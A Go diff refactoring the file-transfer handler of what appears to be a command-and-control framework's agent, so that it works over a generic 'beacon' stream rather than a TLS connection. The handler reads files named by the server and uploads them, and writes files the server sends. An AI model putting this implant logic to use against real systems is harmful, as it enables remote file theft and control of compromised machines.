@@ -1,9 +1,8 @@
 package client_utils
 
 import (
-	"crypto/tls"
 	"fmt"
-	"net"
+	"io"
 	"os"
 	"path/filepath"
 
@@ -12,7 +11,7 @@ import (
 	"github.com/PatronC2/Patron/lib/logger"
 )
 
-func HandleFileRequest(conn *tls.Conn, agentID string) error {
+func HandleFileRequest(beacon io.ReadWriteCloser, agentID string) error {
 	logger.Logf(logger.Info, "Sending file request")
 
 	for {
@@ -24,12 +23,12 @@ func HandleFileRequest(conn *tls.Conn, agentID string) error {
 				},
 			},
 		}
-		if err := common.WriteDelimited(conn, req); err != nil {
+		if err := common.WriteDelimited(beacon, req); err != nil {
 			return fmt.Errorf("send file request: %w", err)
 		}
 
 		resp := &patronobuf.Response{}
-		if err := common.ReadDelimited(conn, resp); err != nil {
+		if err := common.ReadDelimited(beacon, resp); err != nil {
 			return fmt.Errorf("read file response: %w", err)
 		}
 		fileResp := resp.GetFileResponse()
@@ -42,13 +41,13 @@ func HandleFileRequest(conn *tls.Conn, agentID string) error {
 
 		if fileResp.GetTransfertype() == "Download" {
 			if err := handleFileDownload(fileResp); err != nil {
-				_ = sendFileStatus(conn, fileResp, "Error")
+				_ = sendFileStatus(beacon, fileResp, "Error")
 				return err
 			}
-			_ = sendFileStatus(conn, fileResp, "Success")
+			_ = sendFileStatus(beacon, fileResp, "Success")
 		} else if fileResp.GetTransfertype() == "Upload" {
-			if err := handleFileUpload(conn, fileResp); err != nil {
-				_ = sendFileStatus(conn, fileResp, "Error")
+			if err := handleFileUpload(beacon, fileResp); err != nil {
+				_ = sendFileStatus(beacon, fileResp, "Error")
 				return err
 			}
 		}
@@ -71,7 +70,7 @@ func handleFileDownload(file *patronobuf.FileResponse) error {
 	return err
 }
 
-func handleFileUpload(conn net.Conn, file *patronobuf.FileResponse) error {
+func handleFileUpload(beacon io.ReadWriteCloser, file *patronobuf.FileResponse) error {
 	data, err := os.ReadFile(file.GetFilepath())
 	if err != nil {
 		return err
@@ -90,10 +89,10 @@ func handleFileUpload(conn net.Conn, file *patronobuf.FileResponse) error {
 			},
 		},
 	}
-	return common.WriteDelimited(conn, req)
+	return common.WriteDelimited(beacon, req)
 }
 
-func sendFileStatus(conn net.Conn, file *patronobuf.FileResponse, status string) error {
+func sendFileStatus(beacon io.ReadWriteCloser, file *patronobuf.FileResponse, status string) error {
 	statusReq := &patronobuf.Request{
 		Type: patronobuf.RequestType_FILE_TO_SERVER,
 		Payload: &patronobuf.Request_FileToServer{
@@ -106,5 +105,5 @@ func sendFileStatus(conn net.Conn, file *patronobuf.FileResponse, status string)
 			},
 		},
 	}
-	return common.WriteDelimited(conn, statusReq)
+	return common.WriteDelimited(beacon, statusReq)
 }
